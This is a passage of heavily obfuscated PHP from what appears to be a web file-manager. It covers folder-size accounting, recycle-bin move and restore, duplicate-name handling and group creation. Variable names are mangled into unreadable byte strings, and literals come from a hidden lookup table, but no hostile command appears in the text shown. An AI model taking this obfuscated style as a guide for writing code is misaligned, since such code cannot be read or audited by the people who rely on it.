unset(self::$cachePathInfo[$§²ˆˆ¦Ô[2263] . $¸Ñ¾şõØ]); } public function metaSet($ÀŸ£±î, $Æ‰ùÂË¸ = null, $ÁÉ»àìê = null) { $Õ› ÷Òò = parent::metaSet($ÀŸ£±î, $Æ‰ùÂË¸, $ÁÉ»àìê); if ($Õ› ÷Òò) { $this->sourceCacheClear($ÀŸ£±î); } return $Õ› ÷Òò; } public function pathInfoByPath($Ñ±®Îœß, $Ö„›êş©) { $ÅĞßÉËå =& $_SERVER[‹è™Ü¸Ñ]; $îûòÁÌ¿ = !$Ö„›êş© ? array() : explode($ÅĞßÉËå[8], trim($Ö„›êş©, $ÅĞßÉËå[8])); $›Œ®Éé = $Ñ±®Îœß; foreach ($îûòÁÌ¿ as $ä™«¿û) { $¦İç£¾— = array($ÅĞßÉËå[192] => $›Œ®Éé, $ÅĞßÉËå[32] => $ä™«¿û); $Îµ÷ê¤¼ = $this->field($ÅĞßÉËå[2264])->where($¦İç£¾—)->select(); if (!$Îµ÷ê¤¼) { return !1; } $Îµ÷ê¤¼ = array_sort_by($Îµ÷ê¤¼, $ÅĞßÉËå[505]); $›Œ®Éé = $Îµ÷ê¤¼[0][$ÅĞßÉËå[193]]; } $åÕâç´™ = $this->sourceInfo($›Œ®Éé); $this->pathInfoFilter($åÕâç´™); return $åÕâç´™; } protected function updateModifyTime($—‰“Õ¨º) { $”÷¦§¼á =& $_SERVER[‹è™Ü¸Ñ]; $·Ä‰¼ïÇ = defined($”÷¦§¼á[2177]) ? USER_ID : 0; if (!$—‰“Õ¨º) { return; } if (!is_array($—‰“Õ¨º)) { $—‰“Õ¨º = array($—‰“Õ¨º); } foreach ($—‰“Õ¨º as $„ßœüõ => $À‘¡ÓÄğ) { $—‰“Õ¨º[$„ßœüõ] = intval($À‘¡ÓÄğ); $this->sourceCacheClear($À‘¡ÓÄğ); } $é¨ ®õÕ = array($”÷¦§¼á[193] => array($”÷¦§¼á[7], $—‰“Õ¨º)); $¼¯ì¦×Ú = array($”÷¦§¼á[651] => $·Ä‰¼ïÇ, $”÷¦§¼á[498] => time()); $this->where($é¨ ®õÕ)->save($¼¯ì¦×Ú); } public function folderSizeReset($†Ï²²ß, $ìÏ·±ëÎ = false) { $ÊÇñîğş =& $_SERVER[‹è™Ü¸Ñ]; if ($this->statusIgnoreResetSpace) { return; } $à¢ ’ãÜ = $this->sourceInfo($†Ï²²ß); $ùª§œÕÔ = $ÊÇñîğş[2265] . $†Ï²²ß; CacheLock::lock($ùª§œÕÔ, 20); if ($ìÏ·±ëÎ === !1) { $this->sourceCacheClear($†Ï²²ß); $à¢ ’ãÜ = $this->sourceInfo($†Ï²²ß); $“†‡Àğ = array($ÊÇñîğş[477] => $†Ï²²ß, $ÊÇñîğş[504] => 0); $Âıê°ÑÀ = $this->where($“†‡Àğ)->sum($ÊÇñîğş[79]); $ìÏ·±ëÎ = intval($Âıê°ÑÀ) - intval($à¢ ’ãÜ[$ÊÇñîğş[79]]); } if ($ìÏ·±ëÎ == 0) { return CacheLock::unlock($ùª§œÕÔ); } $¼ÄÒ¯» = $this->parentLevelArray($à¢ ’ãÜ[$ÊÇñîğş[584]]); if (!$¼ÄÒ¯») { $¼ÄÒ¯» = array(); } $¼ÄÒ¯»[] = $à¢ ’ãÜ[$ÊÇñîğş[193]]; $“†‡Àğ = array($ÊÇñîğş[193] => array($ÊÇñîğş[492], $¼ÄÒ¯»)); if ($ìÏ·±ëÎ < 0) { $“†‡Àğ[$ÊÇñîğş[79]] = array($ÊÇñîğş[1073], abs($ìÏ·±ëÎ)); } $this->where($“†‡Àğ)->setAdd($ÊÇñîğş[79], $ìÏ·±ëÎ); CacheLock::unlock($ùª§œÕÔ); $”À€Ÿ§ª = $ÊÇñîğş[2266] . $à¢ ’ãÜ[$ÊÇñîğş[190]] . $ÊÇñîğş[4] . $à¢ ’ãÜ[$ÊÇñîğş[569]]; $¸¯Ğâ®™ = array($à¢ ’ãÜ[$ÊÇñîğş[190]], $à¢ ’ãÜ[$ÊÇñîğş[569]]); TaskRun::timeLimitCall($”À€Ÿ§ª, $ÊÇñîğş[2267], $¸¯Ğâ®™, 1.5); } public function folderSizeResetChildren($‚Âöø«Ğ) { $”ˆ­Ï²ä =& $_SERVER[‹è™Ü¸Ñ]; $this->sourceCacheClear($‚Âöø«Ğ); $¡½Á©µ = $this->sourceInfo($‚Âöø«Ğ); $àğ·ççË = array($”ˆ­Ï²ä[646] => 1, $”ˆ­Ï²ä[649] => $¡½Á©µ[$”ˆ­Ï²ä[569]], $”ˆ­Ï²ä[652] => array($”ˆ­Ï²ä[612], $¡½Á©µ[$”ˆ­Ï²ä[584]] . $‚Âöø«Ğ . $”ˆ­Ï²ä[613])); $å†˜Š¦• = $”ˆ­Ï²ä[2268]; $ÀîïœÔ = $this->field($å†˜Š¦•)->where($àğ·ççË)->select(); $àğ·ççË[$”ˆ­Ï²ä[485]] = 0; $åá¸¹±ù = $this->field($å†˜Š¦•)->where($àğ·ççË)->select(); if (!$åá¸¹±ù) { return; } $ÀîïœÔ[] = $¡½Á©µ; $ÀîïœÔ = array_to_keyvalue($ÀîïœÔ, $”ˆ­Ï²ä[193]); foreach ($ÀîïœÔ as $–÷úôá => $ÛÚ˜Ïç¹) { $ÀîïœÔ[$–÷úôá][$”ˆ­Ï²ä[2269]] = $ÀîïœÔ[$–÷úôá][$”ˆ­Ï²ä[79]]; $ÀîïœÔ[$–÷úôá][$”ˆ­Ï²ä[79]] = 0; } foreach ($åá¸¹±ù as $ÛÚ˜Ïç¹) { $™¬¹¦œ¬ = $ÛÚ˜Ïç¹[$”ˆ­Ï²ä[192]] . $”ˆ­Ï²ä[12]; if (!isset($ÀîïœÔ[$™¬¹¦œ¬])) { continue; } if ($ÛÚ˜Ïç¹[$”ˆ­Ï²ä[505]] == $ÀîïœÔ[$™¬¹¦œ¬][$”ˆ­Ï²ä[505]]) { $ÀîïœÔ[$™¬¹¦œ¬][$”ˆ­Ï²ä[79]] += $ÛÚ˜Ïç¹[$”ˆ­Ï²ä[79]]; } } foreach ($ÀîïœÔ as $ÛÚ˜Ïç¹) { $ìûÇ Š = $this->parentLevelArray($ÛÚ˜Ïç¹[$”ˆ­Ï²ä[584]]); foreach ($ìûÇ Š as $™¬¹¦œ¬) { $™¬¹¦œ¬ = $™¬¹¦œ¬ . $”ˆ­Ï²ä[12]; if (!isset($ÀîïœÔ[$™¬¹¦œ¬])) { continue; } if ($ÛÚ˜Ïç¹[$”ˆ­Ï²ä[505]] == $ÀîïœÔ[$™¬¹¦œ¬][$”ˆ­Ï²ä[505]]) { $ÀîïœÔ[$™¬¹¦œ¬][$”ˆ­Ï²ä[79]] += $ÛÚ˜Ïç¹[$”ˆ­Ï²ä[79]]; } } } $€¨–’ô§ = array(); foreach ($ÀîïœÔ as $ÛÚ˜Ïç¹) { if ($ÛÚ˜Ïç¹[$”ˆ­Ï²ä[79]] == $ÛÚ˜Ïç¹[$”ˆ­Ï²ä[2269]]) { continue; } $€¨–’ô§[] = array($”ˆ­Ï²ä[193], $ÛÚ˜Ïç¹[$”ˆ­Ï²ä[193]], $”ˆ­Ï²ä[79], $ÛÚ˜Ïç¹[$”ˆ­Ï²ä[79]]); } $this->saveAll($€¨–’ô§); } public function userSpaceReset($×õë ğå = false) { $äšúŒÆì =& $_SERVER[‹è™Ü¸Ñ]; $»şÄêÅĞ = $this->where(array($äšúŒÆì[190] => self::TYPE_USER, $äšúŒÆì[569] => $×õë ğå, $äšúŒÆì[485] => 0))->sum($äšúŒÆì[79]); $»şÄêÅĞ = !$»şÄêÅĞ || $»şÄêÅĞ <= 0 ? 0 : $»şÄêÅĞ; Model($äšúŒÆì[577])->userEdit($×õë ğå, array($äšúŒÆì[1939] => $»şÄêÅĞ)); } public function targetSpaceUpdate($¾‘§½Ì, $®»õ·š™) { $è°ö­… =& $_SERVER[‹è™Ü¸Ñ]; if (!$®»õ·š™) { return; } if (!in_array($¾‘§½Ì, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $«í– ïÆ = $this->targetSpaceSize($¾‘§½Ì, $®»õ·š™); if ($¾‘§½Ì == self::TYPE_USER) { Model($è°ö­…[577])->userEdit($®»õ·š™, array($è°ö­…[1939] => $«í– ïÆ)); } else { if ($¾‘§½Ì == self::TYPE_GROUP) { Model($è°ö­…[585])->groupEdit($®»õ·š™, array($è°ö­…[1939] => $«í– ïÆ)); } } } public function targetSpaceSize($¢öÂ¨É“, $ğŞ©«ªú) { $Ğ¾°´ô¶ =& $_SERVER[‹è™Ü¸Ñ]; $†ãÌÙ— = 0; $ß¦şÜÍ = $this->targetSourceRoot($¢öÂ¨É“, $ğŞ©«ªú, !0); foreach ($ß¦şÜÍ as $¯â€è‰ş) { if (!$¯â€è‰ş) { continue; } $†ãÌÙ— += floatval($¯â€è‰ş[$Ğ¾°´ô¶[79]]); $—²´‰¾Ñ = array($Ğ¾°´ô¶[652] => array($Ğ¾°´ô¶[612], $Ğ¾°´ô¶[594] . $¯â€è‰ş[$Ğ¾°´ô¶[193]] . $Ğ¾°´ô¶[613])); $“·Ë—Ç÷ = Model($Ğ¾°´ô¶[503])->field($Ğ¾°´ô¶[491])->where($—²´‰¾Ñ)->select(); $“·Ë—Ç÷ = array_to_keyvalue($“·Ë—Ç÷, $Ğ¾°´ô¶[12], $Ğ¾°´ô¶[193]); $“·Ë—Ç÷ = array_unique(array_filter($“·Ë—Ç÷)); if ($“·Ë—Ç÷) { $—²´‰¾Ñ = array($Ğ¾°´ô¶[491] => array($Ğ¾°´ô¶[492], $“·Ë—Ç÷)); $†ãÌÙ— += floatval($this->where($—²´‰¾Ñ)->sum($Ğ¾°´ô¶[79])); } } $†ãÌÙ— = !$†ãÌÙ— || $†ãÌÙ— <= 0 ? 0 : $†ãÌÙ—; return $†ãÌÙ—; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($‘”Ñé¾) { return $this->fileTypeProfile($‘”Ñé¾, SourceModel::TYPE_USER); } public function groupFileTypeProfile($á­×áòº) { return $this->fileTypeProfile($á­×áòº, SourceModel::TYPE_GROUP); } private function fileTypeProfile($€³‚ø˜—, $ÍàÍ¸½—) { $éñÖû¹ =& $_SERVER[‹è™Ü¸Ñ]; $º‰³Ÿ„ = $éñÖû¹[2270] . $€³‚ø˜— . $éñÖû¹[11] . $ÍàÍ¸½—; $­Ëê¬µÙ = Cache::get($º‰³Ÿ„); if ($­Ëê¬µÙ) { return $­Ëê¬µÙ; } $á”Â©½¼ = array($éñÖû¹[646] => 0); if ($€³‚ø˜— != !1) { $á”Â©½¼[$éñÖû¹[569]] = $€³‚ø˜—; $á”Â©½¼[$éñÖû¹[190]] = $ÍàÍ¸½—; } $â—¡•Ş– = array(); $â—¡•Ş–[$éñÖû¹[2271]] = array($éñÖû¹[2272] => LNG($éñÖû¹[2271]), $éñÖû¹[2273] => $this->where($á”Â©½¼)->count(), $éñÖû¹[617] => $this->where($á”Â©½¼)->sum($éñÖû¹[79])); $öÉÛˆš = KodIO::fileTypeList(); foreach ($öÉÛˆš as $ñ•£Şß§ => $È‰ĞòÑü) { $á”Â©½¼[$éñÖû¹[486]] = $this->fileTypeWhere($ñ•£Şß§); $â—¡•Ş–[$ñ•£Şß§] = array($éñÖû¹[2272] => $È‰ĞòÑü[$éñÖû¹[32]], $éñÖû¹[2273] => $this->where($á”Â©½¼)->count(), $éñÖû¹[617] => $this->where($á”Â©½¼)->sum($éñÖû¹[79])); } Cache::set($º‰³Ÿ„, $â—¡•Ş–, 1200); return $â—¡•Ş–; } public function fileNameExist($ûì“ŞÓñ, $µÒûÌÖ») { $ ‚±œ®Ğ =& $_SERVER[‹è™Ü¸Ñ]; $Ÿ‘†«½‘ = $this->field($ ‚±œ®Ğ[2274])->where(array($ ‚±œ®Ğ[192] => $ûì“ŞÓñ, $ ‚±œ®Ğ[32] => $µÒûÌÖ», $ ‚±œ®Ğ[505] => 0))->find(); return is_array($Ÿ‘†«½‘) ? $Ÿ‘†«½‘[$ ‚±œ®Ğ[193]] : !1; } public function childList($¿¥ô¦Ó) { $©ĞÊíÒ£ =& $_SERVER[‹è™Ü¸Ñ]; $Ş„ç¾Ë = $©ĞÊíÒ£[2245] . $¿¥ô¦Ó; if (isset(self::$cacheChildList[$Ş„ç¾Ë])) { return self::$cacheChildList[$Ş„ç¾Ë]; } $ ™¦¶ÖÓ = array($©ĞÊíÒ£[192] => intval($¿¥ô¦Ó), $©ĞÊíÒ£[505] => 0); $Œ³©¶© = $this->where($ ™¦¶ÖÓ)->select(); $Œ³©¶© = $Œ³©¶© ? $Œ³©¶© : array(); self::$cacheChildList[$Ş„ç¾Ë] = $Œ³©¶©; foreach ($Œ³©¶© as $ªà¸ì) { $Ş„ç¾Ë = $©ĞÊíÒ£[533] . $ªà¸ì[$©ĞÊíÒ£[193]]; self::$cacheSourceInfo[$Ş„ç¾Ë] = $ªà¸ì; } return $Œ³©¶©; } public function fileNameAuto($ü“ÛÍ‡ˆ, $Æ¦ËœĞ, $Ğˆ ğä· = REPEAT_RENAME, $ÔÆ€ª…¯ = false) { $íù»šøà =& $_SERVER[‹è™Ü¸Ñ]; $œçøÈº‚ = get_path_ext($Æ¦ËœĞ); $“·ÆÑ¶¦ = $œçøÈº‚ ? get_path_ext_name($Æ¦ËœĞ) . $íù»šøà[2275] . $œçøÈº‚ : $Æ¦ËœĞ . $íù»šøà[460]; $¾òÁŸ“ = array($íù»šøà[192] => $ü“ÛÍ‡ˆ, $íù»šøà[505] => 0, $íù»šøà[32] => array($íù»šøà[459], $“·ÆÑ¶¦)); $¢é×¨œ = $this->field($íù»šøà[32])->where($¾òÁŸ“)->select(); $ñäñŒº = array_to_keyvalue($¢é×¨œ, $íù»šøà[12], $íù»šøà[32]); return $this->fileNameAutoGet($ñäñŒº, $Æ¦ËœĞ, $Ğˆ ğä·, $ÔÆ€ª…¯); } public function fileNameAutoGet($ãä¦, $™„„ÊÈÚ, $ú®ÇÛ€, $ïéàºÒ) { $·ª·½…µ =& $_SERVER[‹è™Ü¸Ñ]; if ($ú®ÇÛ€ == REPEAT_REPLACE || !$ãä¦ || !in_array_not_case($™„„ÊÈÚ, $ãä¦) || $ïéàºÒ && $ú®ÇÛ€ != REPEAT_RENAME_FOLDER) { return $™„„ÊÈÚ; } if ($ú®ÇÛ€ == REPEAT_SKIP) { return !1; } $õ¢÷‚á = $·ª·½…µ[10] . get_path_ext($™„„ÊÈÚ); $õ¢÷‚á = $õ¢÷‚á == $·ª·½…µ[10] || $ïéàºÒ ? $·ª·½…µ[12] : $õ¢÷‚á; for ($ŞâäŸ²Å = 1; $ŞâäŸ²Å <= count($ãä¦) + 1; $ŞâäŸ²Å++) { $Î¸±±Ç§ = substr($™„„ÊÈÚ, 0, strlen($™„„ÊÈÚ) - strlen($õ¢÷‚á)); $¼¾Ú×ÁĞ = $Î¸±±Ç§ . "\x28{$ŞâäŸ²Å}\51{$õ¢÷‚á}"; if (!in_array_not_case($¼¾Ú×ÁĞ, $ãä¦)) { return $¼¾Ú×ÁĞ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\143\145\137\162\x65\x63\171\143\x6c\x65"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\x54\151\x6d\145", "\164\151\155\x65", "\151\156\163\x65\162\164", "\x66\x75\x6e\x63\x74\151\157\156")); public function listData($’·œ¾è = false) { $¹ÁÈÚçâ =& $_SERVER[‹è™Ü¸Ñ]; $’·œ¾è = $’·œ¾è ? $’·œ¾è : USER_ID; $¿äÍğœ = $this->where(array($¹ÁÈÚçâ[1743] => $’·œ¾è))->select(); return array_to_keyvalue($¿äÍğœ, $¹ÁÈÚçâ[12], $¹ÁÈÚçâ[193]); } public function moveToRecycle($¦àüüÔ) { $ë¼¢·„­ =& $_SERVER[‹è™Ü¸Ñ]; $Û®Ä›¾” = Model($ë¼¢·„­[1398]); $öÎóøß¦ = $Û®Ä›¾”->sourceInfo($¦àüüÔ); if (!$öÎóøß¦ || $öÎóøß¦[$ë¼¢·„­[505]] == $ë¼¢·„­[91]) { return; } $ÁŠ¼ºÔê = array($ë¼¢·„­[491] => $¦àüüÔ, $ë¼¢·„­[1743] => USER_ID, $ë¼¢·„­[648] => $öÎóøß¦[$ë¼¢·„­[190]], $ë¼¢·„­[649] => $öÎóøß¦[$ë¼¢·„­[569]], $ë¼¢·„­[652] => $öÎóøß¦[$ë¼¢·„­[584]]); $this->add($ÁŠ¼ºÔê); $this->recycleMove($¦àüüÔ, 1); if ($öÎóøß¦[$ë¼¢·„­[485]] == $ë¼¢·„­[91]) { $ıŠ§—ÈŞ = array($ë¼¢·„­[652] => array($ë¼¢·„­[612], $öÎóøß¦[$ë¼¢·„­[584]] . $¦àüüÔ . $ë¼¢·„­[613])); $Û®Ä›¾”->where($ıŠ§—ÈŞ)->setField($ë¼¢·„­[505], 1); } } public function clear() { $this->remove(!1); } public function remove($šÏæ¨™Û = false, $ÆŞâóÁ™ = false) { $’äù…Èá =& $_SERVER[‹è™Ü¸Ñ]; $ÆŞâóÁ™ = $ÆŞâóÁ™ ? $ÆŞâóÁ™ : USER_ID; $›»¦Ø³ = Model($’äù…Èá[1398]); $¼¼²¢” = $this->listData($ÆŞâóÁ™); $šÏæ¨™Û = $šÏæ¨™Û === !1 ? !1 : $šÏæ¨™Û; $Ã¶˜…Üø = array(); foreach ($¼¼²¢” as $ĞÉ´¶¹) { if ($šÏæ¨™Û != !1 && !in_array($ĞÉ´¶¹, $šÏæ¨™Û)) { continue; } $å„ã¥ÒÔ = $›»¦Ø³->sourceInfo($ĞÉ´¶¹); $›»¦Ø³->remove($ĞÉ´¶¹, !1); $¨ Û° = $å„ã¥ÒÔ[$’äù…Èá[190]] . $’äù…Èá[11] . $å„ã¥ÒÔ[$’äù…Èá[569]]; $Ã¶˜…Üø[$¨ Û°] = array($’äù…Èá[648] => $å„ã¥ÒÔ[$’äù…Èá[190]], $’äù…Èá[569] => $å„ã¥ÒÔ[$’äù…Èá[569]]); $this->where(array($’äù…Èá[193] => $ĞÉ´¶¹))->delete(); } foreach ($Ã¶˜…Üø as $ı˜‚êöà) { $›»¦Ø³->targetSpaceUpdate($ı˜‚êöà[$’äù…Èá[190]], $ı˜‚êöà[$’äù…Èá[569]]); } } public function restore($ßØåüê = false) { $§Ò™÷»ø = $this->listData(); $this->_restoreSource($§Ò™÷»ø, $ßØåüê); } public function removeUserAll($ªŒ„°ÚÅ) { $this->remove(!1, $ªŒ„°ÚÅ); } public function restoreItem($Â”¬œÏ) { $this->_restoreSource(array($Â”¬œÏ), array($Â”¬œÏ)); } private function _restoreSource($ÔåùØ¹ı, $Ÿ¨”–¼›) { $ÖíéÇ¡î =& $_SERVER[‹è™Ü¸Ñ]; $¬Ï¡±ã = Model($ÖíéÇ¡î[1398]); $Ÿ¨”–¼› = $Ÿ¨”–¼› == !1 ? !1 : $Ÿ¨”–¼›; if (!$ÔåùØ¹ı) { return !0; } $³¨ıÊÅ» = array(); foreach ($ÔåùØ¹ı as $Öš„‘â„) { if ($Ÿ¨”–¼› != !1 && !in_array($Öš„‘â„, $Ÿ¨”–¼›)) { continue; } $Üæƒô ¦ = $¬Ï¡±ã->sourceInfo($Öš„‘â„); $ÎØå ¶¡ = $¬Ï¡±ã->sourceInfo($Üæƒô ¦[$ÖíéÇ¡î[192]]); if ($ÎØå ¶¡[$ÖíéÇ¡î[505]] == $ÖíéÇ¡î[91]) { continue; } $¬Ï¡±ã->lockMoveStart($Öš„‘â„); $this->recycleMove($Öš„‘â„, 0); if ($Üæƒô ¦[$ÖíéÇ¡î[485]] == $ÖíéÇ¡î[91]) { $ºüó²”Ç = array($ÖíéÇ¡î[652] => array($ÖíéÇ¡î[612], $Üæƒô ¦[$ÖíéÇ¡î[584]] . $Öš„‘â„ . $ÖíéÇ¡î[613])); $¬Ï¡±ã->where($ºüó²”Ç)->setField($ÖíéÇ¡î[505], 0); $this->restoreFolderChildren($Öš„‘â„, $ÔåùØ¹ı); } $this->where(array($ÖíéÇ¡î[193] => $Öš„‘â„))->delete(); $¬Ï¡±ã->folderSizeReset($Üæƒô ¦[$ÖíéÇ¡î[192]]); $³¨ıÊÅ»[] = $Üæƒô ¦[$ÖíéÇ¡î[192]]; if ($Üæƒô ¦[$ÖíéÇ¡î[485]] == $ÖíéÇ¡î[91]) { $³¨ıÊÅ»[] = $Öš„‘â„; } $¬Ï¡±ã->lockMoveEnd($Öš„‘â„); } $¬Ï¡±ã->updateModifyTime($³¨ıÊÅ»); } private function restoreFolderChildren($’˜ ¬¿¢, $èÈ—é°©) { $Ğ¦çãö =& $_SERVER[‹è™Ü¸Ñ]; $ÃÚåŞåØ = Model($Ğ¦çãö[1398]); $ıêè Ñ = array($Ğ¦çãö[193] => array($Ğ¦çãö[7], array())); foreach ($èÈ—é°© as $á¬Õ¹ ) { if ($á¬Õ¹  == $’˜ ¬¿¢) { continue; } if (!$ÃÚåŞåØ->isParentOf($’˜ ¬¿¢, $á¬Õ¹ )) { continue; } $ÁÍç†Ìæ = $ÃÚåŞåØ->sourceInfo($á¬Õ¹ ); if ($ÁÍç†Ìæ[$Ğ¦çãö[485]] == $Ğ¦çãö[91]) { $ıêè Ñ[] = array($Ğ¦çãö[652] => array($Ğ¦çãö[612], $ÁÍç†Ìæ[$Ğ¦çãö[584]] . $á¬Õ¹  . $Ğ¦çãö[613])); } else { $ıêè Ñ[$Ğ¦çãö[193]][1][] = $á¬Õ¹ ; } } if (!$ıêè Ñ[$Ğ¦çãö[193]][1]) { unset($ıêè Ñ[$Ğ¦çãö[193]]); } if (!$ıêè Ñ) { return; } if (is_array($ıêè Ñ[$Ğ¦çãö[193]]) && is_array($ıêè Ñ[$Ğ¦çãö[193]][1])) { $ıêè Ñ[$Ğ¦çãö[193]][1] = array_unique($ıêè Ñ[$Ğ¦çãö[193]][1]); } $ıêè Ñ[$Ğ¦çãö[1058]] = $Ğ¦çãö[2053]; $ÃÚåŞåØ->where($ıêè Ñ)->setField($Ğ¦çãö[505], 1); } private function recycleMove($Îí £ê², $«Óôó³ = 1) { $‘ö˜èšÏ =& $_SERVER[‹è™Ü¸Ñ]; $ú°™ú· = Model($‘ö˜èšÏ[1398]); $ş‚öÄİ = Model($‘ö˜èšÏ[2276]); $šµ¹Û¼® = array($‘ö˜èšÏ[193] => $Îí £ê²); if ($«Óôó³) { $ú°™ú·->where($šµ¹Û¼®)->setField($‘ö˜èšÏ[505], 1); $ş‚öÄİ->eventRecycle($Îí £ê², $‘ö˜èšÏ[2277]); } else { $´¬ÖÍšğ = $ú°™ú·->where($šµ¹Û¼®)->find(); $á¨Ñ˜ı = $´¬ÖÍšğ[$‘ö˜èšÏ[485]] == $‘ö˜èšÏ[91]; $µï˜ŞÂ„ = $ú°™ú·->fileNameAuto($´¬ÖÍšğ[$‘ö˜èšÏ[192]], $´¬ÖÍšğ[$‘ö˜èšÏ[32]], REPEAT_RENAME_FOLDER, $á¨Ñ˜ı); if ($µï˜ŞÂ„ != $´¬ÖÍšğ[$‘ö˜èšÏ[32]]) { $ú°™ú·->rename($Îí £ê², $µï˜ŞÂ„); } $ú°™ú·->where($šµ¹Û¼®)->setField($‘ö˜èšÏ[505], 0); $ş‚öÄİ->eventRecycle($Îí £ê², $‘ö˜èšÏ[2278]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x73\x6f\165\x72\143\145\x53\x65\x63\x72\x65\164\x4c\151\163\x74"; public $field = array("\x73\157\x75\x72\143\145\x49\104", "\164\171\160\145\x49\104", "\x63\x72\x65\x61\164\x65\125\x73\145\x72"); } goto Dé‹¯‰Ê–; C‰å—Œ–¼ã: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\x67\x72\x6f\x75\160\137\x6d\145\x74\x61", "\155\x65\164\x61\x46\151\145\x6c\144" => "\x67\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($«İ¸ÅË) { $ĞĞ»•Á³ =& $_SERVER[‹è™Ü¸Ñ]; return array($ĞĞ»•Á³[2033] => array($«İ¸ÅË[0], $ĞĞ»•Á³[2034]), $ĞĞ»•Á³[2035] => array($«İ¸ÅË[0], $ĞĞ»•Á³[2036])); } protected function getInfo($íÇ‰²æ¯, $ü®‰Ûôº = false) { $Ÿ¸Ö¦ÍÂ = $this->getInfoSimple($íÇ‰²æ¯); if (!$Ÿ¸Ö¦ÍÂ) { return !1; } if ($ü®‰Ûôº) { return $this->_listDataApplyItem($Ÿ¸Ö¦ÍÂ); } return $this->cacheFunctionGet($_SERVER[‹è™Ü¸Ñ][2037], $íÇ‰²æ¯); } protected function getInfoSimple($øçéõâõ, $Ù”±€Éñ = false) { $´ˆúéå =& $_SERVER[‹è™Ü¸Ñ]; if ($Ù”±€Éñ) { $Ä¶ÏÖˆ = array($´ˆúéå[1951] => intval($øçéõâõ)); $€Ú“êí¢ = $this->where($Ä¶ÏÖˆ)->find(); return is_array($€Ú“êí¢) ? $€Ú“êí¢ : array(); } return $this->cacheFunctionGet($´ˆúéå[2038], $øçéõâõ); } protected function groupAdd($ï‹à°ù¦) { $úÉ¡‚ĞÃ =& $_SERVER[‹è™Ü¸Ñ]; if (!$ï‹à°ù¦[$úÉ¡‚ĞÃ[192]] && isset($ï‹à°ù¦[$úÉ¡‚ĞÃ[1951]]) && $ï‹à°ù¦[$úÉ¡‚ĞÃ[1951]] == 1) { if ($«Õ‹»Éå = $this->getInfoSimple($ï‹à°ù¦[$úÉ¡‚ĞÃ[1951]], !0)) { return $ï‹à°ù¦[$úÉ¡‚ĞÃ[1951]]; } } else { $«Õ‹»Éå = $this->getInfoSimple($ï‹à°ù¦[$úÉ¡‚ĞÃ[192]]); if (!$«Õ‹»Éå) { return !1; } } $öÁÄ·Ñ = $úÉ¡‚ĞÃ[594]; if ($«Õ‹»Éå[$úÉ¡‚ĞÃ[584]]) { $öÁÄ·Ñ = $«Õ‹»Éå[$úÉ¡‚ĞÃ[584]] . $«Õ‹»Éå[$úÉ¡‚ĞÃ[1951]] . $úÉ¡‚ĞÃ[50]; } $®Á‚æŠ = array($úÉ¡‚ĞÃ[494] => $this->groupNameAuto($ï‹à°ù¦[$úÉ¡‚ĞÃ[192]], $ï‹à°ù¦[$úÉ¡‚ĞÃ[32]]), $úÉ¡‚ĞÃ[477] => $ï‹à°ù¦[$úÉ¡‚ĞÃ[192]], $úÉ¡‚ĞÃ[652] => $öÁÄ·Ñ, $úÉ¡‚ĞÃ[2039] => $ï‹à°ù¦[$úÉ¡‚ĞÃ[1937]], $úÉ¡‚ĞÃ[2040] => 0, $úÉ¡‚ĞÃ[1955] => 0); if (isset($ï‹à°ù¦[$úÉ¡‚ĞÃ[1975]])) { $®Á‚æŠ[$úÉ¡‚ĞÃ[1975]] = $ï‹à°ù¦[$úÉ¡‚ĞÃ[1975]]; } else { $Ø‡¨Æ—Ú = $this->max($úÉ¡‚ĞÃ[1975]); if (!$Ø‡¨Æ—Ú) { $Ø‡¨Æ—Ú = 0; } $®Á‚æŠ[$úÉ¡‚ĞÃ[1975]] = $Ø‡¨Æ—Ú + 1; } if (!empty($ï‹à°ù¦[$úÉ¡‚ĞÃ[1951]])) { $®Á‚æŠ[$úÉ¡‚ĞÃ[1951]] = $ï‹à°ù¦[$úÉ¡‚ĞÃ[1951]]; } $Ø¯ª¤†§ = $this->add($®Á‚æŠ); $this->setNamePinyin($Ø¯ª¤†§, $®Á‚æŠ[$úÉ¡‚ĞÃ[32]]); if (isset($ï‹à°ù¦[$úÉ¡‚ĞÃ[2041]])) { $this->metaSet($Ø¯ª¤†§, array($úÉ¡‚ĞÃ[2041] => $ï‹à°ù¦[$úÉ¡‚ĞÃ[2041]], $úÉ¡‚ĞÃ[2042] => $ï‹à°ù¦[$úÉ¡‚ĞÃ[2042]])); unset($ï‹à°ù¦[$úÉ¡‚ĞÃ[2041]]); unset($ï‹à°ù¦[$úÉ¡‚ĞÃ[2042]]); } Model($úÉ¡‚ĞÃ[1398])->groupRootAdd($Ø¯ª¤†§); $this->_clearCache($ï‹à°ù¦[$úÉ¡‚ĞÃ[192]]); return $Ø¯ª¤†§; } protected function groupEdit($‹İÏó÷Ğ, $Á¸ÛÓ¿Œ) { $ô³ˆöë± =& $_SERVER[‹è™Ü¸Ñ]; $ÜÚöÁñ = $this->getInfoSimple($‹İÏó÷Ğ); if (!$ÜÚöÁñ) { return !1; } if (!empty($Á¸ÛÓ¿Œ[$ô³ˆöë±[192]])) { $‹öÉÄ¹² = $this->getInfoSimple($Á¸ÛÓ¿Œ[$ô³ˆöë±[192]]); if (!$‹öÉÄ¹²) { return !1; } if ($ÜÚöÁñ[$ô³ˆöë±[1951]] == $‹öÉÄ¹²[$ô³ˆöë±[1951]]) { return !1; } if ($Á¸ÛÓ¿Œ[$ô³ˆöë±[192]] != $ÜÚöÁñ[$ô³ˆöë±[192]]) { if ($‹öÉÄ¹²[$ô³ˆöë±[584]] !== $ÜÚöÁñ[$ô³ˆöë±[584]] && strpos($‹öÉÄ¹²[$ô³ˆöë±[584]], $ÜÚöÁñ[$ô³ˆöë±[584]] . $ÜÚöÁñ[$ô³ˆöë±[1951]] . $ô³ˆöë±[50]) === 0) { return !1; } $Á¸ÛÓ¿Œ[$ô³ˆöë±[652]] = $‹öÉÄ¹²[$ô³ˆöë±[584]] . $Á¸ÛÓ¿Œ[$ô³ˆöë±[192]] . $ô³ˆöë±[50]; $this->_changeChildLevel($ÜÚöÁñ, $‹öÉÄ¹²); 